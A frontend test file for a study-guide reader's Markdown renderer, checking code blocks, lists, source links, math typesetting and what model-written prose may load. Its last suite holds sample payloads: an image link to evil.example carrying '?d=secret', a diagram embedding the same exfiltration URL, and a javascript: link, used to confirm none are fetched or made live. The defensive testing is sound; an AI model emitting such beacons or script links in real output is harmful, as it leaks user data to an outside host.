// @vitest-environment jsdom
/**
 * A prose passage through the real Markdown renderer: a paragraph that is a
 * fenced code block or a list is drawn as that block, and its sources still
 * show; math and money; and nothing a model wrote can fetch a URL by itself.
 * The other reader suites stand the renderer in; this one does not.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, within } from "@testing-library/react";

// The page loads the renderer lazily. Here the reader's own wrapper gets the
// real one, already loaded.
vi.mock("next/dynamic", async () => {
  const { MarkdownChat } = await import("@/components/chat/MarkdownChat");
  return { default: () => MarkdownChat };
});

// The chat's diagram and plot, stood in so a test can see whether one mounts.
vi.mock("@/components/chat/MermaidBlock", () => ({
  MermaidBlock: () => <div data-testid="mermaid-block" />,
}));
vi.mock("@/components/chat/FunctionPlot", () => ({
  FunctionPlot: () => <div data-testid="function-plot" />,
}));

import type { Paragraph, ProseItem } from "@/lib/studyGuide/types";

import { Prose } from "./Prose";
import { ReaderProvider, type Reader } from "./ReaderContext";
import { fixtureGuide } from "./readerFixture";
import { isBlockMarkdown, type ViewMode } from "./readerModel";

const SOURCE = fixtureGuide().content.sources[0];
const CODE = "```python\nfor i in range(3):\n    print(i)\n```";
const LIST = "- A loop repeats a block.\n- A **counter** tracks the pass.";

function renderProse(paragraphs: Paragraph[], mode: ViewMode = "read") {
  const item: ProseItem = { type: "prose", id: "p1", paragraphs, summary: "Loops repeat." };
  const reader: Reader = {
    userId: "u1",
    guide: fixtureGuide(),
    mode,
    generating: false,
    rewriting: null,
    update: () => {},
    regenerateBlock: () => {},
    askTutor: async () => {},
    tutorBusy: false,
  };
  return render(
    <ReaderProvider value={reader}>
      <Prose item={item} />
    </ReaderProvider>,
  );
}

afterEach(cleanup);

describe("isBlockMarkdown", () => {
  it("is false for one run of text, with terms and inline math", () => {
    expect(isBlockMarkdown("A **loop** runs $n$ times.")).toBe(false);
    expect(isBlockMarkdown("A range like 3-5 is not a list.\nNor is a second line.")).toBe(false);
  });

  it("is true for a code fence, a list and several blocks", () => {
    expect(isBlockMarkdown(CODE)).toBe(true);
    expect(isBlockMarkdown(LIST)).toBe(true);
    expect(isBlockMarkdown("1. First\n2. Second")).toBe(true);
    expect(isBlockMarkdown("Read this:\n\n" + CODE)).toBe(true);
    expect(isBlockMarkdown("One paragraph.\n\nAnother.")).toBe(true);
  });
});

describe("a prose passage", () => {
  it("draws a fenced code block as a code block, with its source under it", async () => {
    renderProse([{ text: CODE, citations: [SOURCE.id] }]);
    const code = await screen.findByText(/range/, { selector: "pre *" });
    const pre = code.closest("pre");
    expect(pre).not.toBeNull();
    expect(pre).toHaveTextContent("for i in range(3): print(i)");
    expect(pre?.querySelector("code")?.className).toContain("language-python");
    // In the reader's own code style, not the chat's.
    expect(pre?.className).toContain("code");
    // The fence is not shown as text.
    expect(screen.getByTestId("guide-prose-p1")).not.toHaveTextContent("```");
    expect(screen.getByRole("link", { name: `Source: ${SOURCE.name}` })).toHaveAttribute("href", "#guide-sources");
  });

  it("draws `- a` lines as a list, with key terms highlighted and its source under it", async () => {
    renderProse([{ text: LIST, citations: [SOURCE.id] }]);
    const list = await screen.findByRole("list");
    const items = within(list).getAllByRole("listitem");
    expect(items.map(item => item.textContent)).toEqual(["A loop repeats a block.", "A counter tracks the pass."]);
    expect(within(items[1]).getByText("counter").tagName).toBe("STRONG");
    expect(screen.getByRole("link", { name: `Source: ${SOURCE.name}` })).toBeInTheDocument();
  });

  it("keeps a plain paragraph's source at the end of its own line", async () => {
    renderProse([{ text: "A **loop** repeats a block.", citations: [SOURCE.id] }]);
    const cite = await screen.findByRole("link", { name: `Source: ${SOURCE.name}` });
    expect(cite.parentElement?.tagName).toBe("P");
    expect(cite.parentElement).toHaveTextContent("A loop repeats a block.");
  });

  it("draws text, then a code block, in one passage", async () => {
    renderProse([
      { text: "A counting loop:", citations: [] },
      { text: CODE, citations: [] },
    ]);
    const prose = screen.getByTestId("guide-prose-p1");
    await within(prose).findByText("A counting loop:");
    expect(prose.querySelectorAll("pre")).toHaveLength(1);
    expect(screen.queryByRole("link")).not.toBeInTheDocument();
  });

  it("is one summary line in Skim", () => {
    renderProse([{ text: CODE, citations: [] }], "skim");
    expect(screen.getByTestId("guide-skim-p1")).toHaveTextContent("Loops repeat.");
    expect(screen.queryByTestId("guide-prose-p1")).not.toBeInTheDocument();
  });
});

describe("math and money in a passage", () => {
  it("typesets inline math", async () => {
    renderProse([{ text: "Demand is elastic when $E_d = 1.5$ or more.", citations: [] }]);
    const prose = screen.getByTestId("guide-prose-p1");
    await within(prose).findByText(/Demand is elastic when/);
    expect(prose.querySelectorAll(".katex")).toHaveLength(1);
    expect(prose).not.toHaveTextContent("$");
  });

  it("shows a money amount written with a backslash as money, beside real math", async () => {
    // What the section writer is told to write. Two bare dollar signs in one
    // paragraph would be read as the two ends of a formula.
    renderProse([{ text: "A firm raises its price from \\$4 to \\$5, so $E_d = 1.5$.", citations: [] }]);
    const prose = screen.getByTestId("guide-prose-p1");
    await within(prose).findByText(/A firm raises its price from \$4 to \$5, so/);
    expect(prose.querySelectorAll(".katex")).toHaveLength(1);
  });
});

describe("what a passage may load", () => {
  it("draws no image, so opening a guide never fetches a URL a document planted", async () => {
    renderProse([{ text: "Before ![chart](https://evil.example/x.png?d=secret) after.", citations: [] }]);
    const prose = screen.getByTestId("guide-prose-p1");
    await within(prose).findByText(/Before/);
    expect(prose.querySelector("img")).toBeNull();
    expect(prose).toHaveTextContent("Before after.");
  });

  it("draws no embedded frame", async () => {
    renderProse([
      { text: "An embed:", citations: [] },
      { text: "::geogebra{id=abc123}", citations: [] },
    ]);
    const prose = screen.getByTestId("guide-prose-p1");
    await within(prose).findByText("An embed:");
    expect(prose.querySelector("iframe")).toBeNull();
  });

  it("shows a diagram fence as its code, so no diagram is drawn to fetch the image it names", async () => {
    const diagram = "```mermaid\ngraph TD\n  A[\"<img src='https://evil.example/x.png?d=secret'>\"] --> B\n```";
    renderProse([{ text: diagram, citations: [] }]);
    const code = await screen.findByText(/graph TD/, { selector: "pre *" });
    expect(code.closest("pre")).toHaveTextContent("evil.example");
    expect(screen.queryByTestId("mermaid-block")).not.toBeInTheDocument();
    expect(screen.getByTestId("guide-prose-p1").querySelector("img")).toBeNull();
  });

  it("shows a plot fence as its code", async () => {
    renderProse([{ text: "```plot\n{\"data\": [{\"fn\": \"x^2\"}]}\n```", citations: [] }]);
    const code = await screen.findByText(/x\^2/, { selector: "pre *" });
    expect(code.closest("pre")).not.toBeNull();
    expect(screen.queryByTestId("function-plot")).not.toBeInTheDocument();
  });

  it("opens a link in a new tab without a referrer, and drops a script link's target", async () => {
    renderProse([{ text: "See [the notes](https://example.com/notes) or [this](javascript:alert(1)).", citations: [] }]);
    const link = await screen.findByRole("link", { name: "the notes" });
    expect(link).toHaveAttribute("href", "https://example.com/notes");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noreferrer");
    expect(screen.getByText("this")).not.toHaveAttribute("href", expect.stringContaining("javascript"));
  });
});
